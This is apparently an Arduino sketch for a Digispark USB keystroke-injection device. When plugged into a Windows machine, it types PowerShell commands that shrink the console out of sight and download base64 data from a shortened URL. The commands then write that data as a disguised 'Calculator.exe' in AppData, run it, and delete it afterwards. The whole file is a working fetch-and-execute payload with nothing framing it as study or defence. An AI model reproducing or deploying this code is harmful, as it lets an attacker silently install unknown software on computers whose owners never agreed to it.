#include "DigiKeyboard.h"

//#define KEY_UP_ARROW   0x52
#define KEY_DOWN_ARROW   0x51
//#define KEY_LEFT_ARROW   0x50
//#define KEY_RIGHT_ARROW   0x4F

void setup()
{
 pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
  digitalWrite(1, HIGH); //turn on led when program starts
  DigiKeyboard.update();
  delay(2000);
  DigiKeyboard.sendKeyStroke(0); // ???
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // win+r
  DigiKeyboard.delay(300);
  digitalWrite(1, HIGH);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.println("mode con:cols=18 lines=1");
  //DigiKeyboard.delay(100);
  DigiKeyboard.println("$url = 'https://goo.gl/xWyjLo'");
  //DigiKeyboard.delay(100);
  DigiKeyboard.println("$result = Invoke-WebRequest -Uri $url -usebasicparsing");
  DigiKeyboard.println("$filename = $Env:appdata + '\\Calculator.exe'");
  //DigiKeyboard.delay(100);
  DigiKeyboard.println("$bytes = [Convert]::FromBase64String($result)");
  DigiKeyboard.println("[IO.File]::WriteAllBytes($filename, $bytes)");
  //DigiKeyboard.println("mv baase64.exe $filename");
  DigiKeyboard.println("start $filename\nsleep200\ndel $filename\nexit");
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW, MOD_GUI_LEFT);
  digitalWrite(1, LOW); //turn on led when program starts
  for( ;  ; ){}
}
